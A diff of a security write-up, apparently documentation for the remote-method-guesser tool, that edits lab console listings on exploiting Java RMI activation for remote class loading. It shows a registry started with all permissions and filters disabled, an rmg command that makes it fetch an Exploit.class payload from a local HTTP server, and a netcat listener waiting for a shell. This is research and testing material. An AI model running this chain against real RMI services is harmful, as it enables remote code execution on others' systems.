@@ -90,7 +90,7 @@ The first candidate for a *UnicastRemoteObject* that could potentially be abused
 which classes actually are based on *UnicastRemoteObject*:
 
 ```console
-[qtc@kali src]$ grep --exclude "UnicastRemoteObject.java" -R "extends UnicastRemoteObject" * | egrep -v "^test"
+[qtc@devbox src]$ grep --exclude "UnicastRemoteObject.java" -R "extends UnicastRemoteObject" * | egrep -v "^test"
 java.rmi/share/classes/java/rmi/activation/ActivationGroup.java:        extends UnicastRemoteObject
 java.rmi/share/classes/sun/rmi/server/Activation.java:    class ActivationMonitorImpl extends UnicastRemoteObject
 jdk.hotspot.agent/share/classes/sun/jvm/hotspot/debugger/remote/RemoteDebuggerServer.java:public class RemoteDebuggerServer extends UnicastRemoteObject
@@ -291,11 +291,11 @@ is not a default configuration and requires a custom security policy.
 For demonstration purposes, we can construct the previous case by running a plain ``rmiregistry`` using the following arguments:
 
 ```console
-[qtc@kali ~]$ cat /tmp/policy 
+[qtc@devbox ~]$ cat /tmp/policy
 grant {
     permission java.security.AllPermission "", "";
 };
-[qtc@kali ~]$ sudo rmiregistry -J'-Djava.security.policy=/tmp/policy' -J'-Dsun.rmi.registry.registryFilter=*'
+[qtc@devbox ~]$ sudo rmiregistry -J'-Djava.security.policy=/tmp/policy' -J'-Dsun.rmi.registry.registryFilter=*'
 ```
 
 As one can see, we assign all security permissions to the registry, disable the *deserialization* filters (to simulate a pre *JEP290* registry)
@@ -419,21 +419,17 @@ public class ActivationSystem {
 The following listing shows an successful execution against a registry running with the above mentioned arguments:
 
 ```java
-[qtc@kali remote-method-guesser]$ rmg 127.0.0.1 1099 new http://127.0.0.1:8000/ Exploit
+[qtc@devbox remote-method-guesser]$ rmg sample 127.0.0.1 1099 http://127.0.0.1:8000/ Exploit
 [+] Binding name when-all-stars-align
 [+] 
 [+] 	Encountered no Exception during bind call.
 [+] 	Bind operation was probably successful.
-[+]
-[+] 	RMI object tries to connect to different remote host: 127.0.1.1.
-[+] 		Redirecting the connection back to 127.0.0.1... 
-[+] 		This is done for all further requests. This message is not shown again. 
 
-[qtc@kali www]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 127.0.0.1 - - [11/Feb/2021 07:35:37] "GET /Exploit.class HTTP/1.1" 200 -
 
-[qtc@kali ~]$ nc -vlp 4446
+[qtc@devbox ~]$ nc -vlp 4446
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4446
 Ncat: Listening on 0.0.0.0:4446
